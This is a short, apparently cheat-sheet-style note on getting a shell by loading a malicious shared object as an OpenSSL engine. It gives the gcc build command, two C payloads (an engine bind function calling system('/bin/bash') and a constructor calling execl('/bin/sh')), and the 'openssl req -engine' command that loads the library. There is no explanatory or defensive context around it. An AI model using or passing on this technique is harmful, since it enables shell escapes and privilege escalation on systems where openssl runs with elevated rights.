gcc -fPIC -o file-name.o -c file-name.c && gcc -shared -o filename.so -lcrypto file-name.o
example code c
```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
or
```
#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "sh", NULL);
}
```
and exec lib 
openssl req -engine /tmp/filename.so
